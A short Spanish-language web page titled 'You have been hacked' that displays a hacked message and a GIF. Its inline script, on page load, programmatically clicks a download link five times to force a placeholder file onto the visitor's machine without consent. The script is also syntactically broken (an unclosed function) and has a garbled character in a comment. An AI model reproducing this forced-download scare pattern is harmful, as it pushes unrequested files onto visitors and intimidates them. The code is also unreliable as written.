<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Usted ha sido hackeado</title>
    <link rel="stylesheet" href="styles.css">
    <script>
       window.onload = function() {
            // Ejecutar la descarga 5 veces
            for (let i = 0; i < 5; i++) {
                // Crear un enlace temporal para la descarga
                const link = document.createElement('a');
                link.href = 'archivo-a-descargar.ext'; // Ruta al archivo que se va a descargar
                link.download = 'archivo-a-descargar.ext'; // Nombre del archivo con el que se descargarÃ¡
                link.click(); // Simula un clic en el enlace para iniciar la descarga
            }
    </script>
</head>
<body>
    <div class="container">
        <h1>Has sido hackeado</h1>
        <div class="gif-container">
            <img src="IMG/KB6s.gif" alt="GIF local">
        </div>
    </div>
</body>
</html>
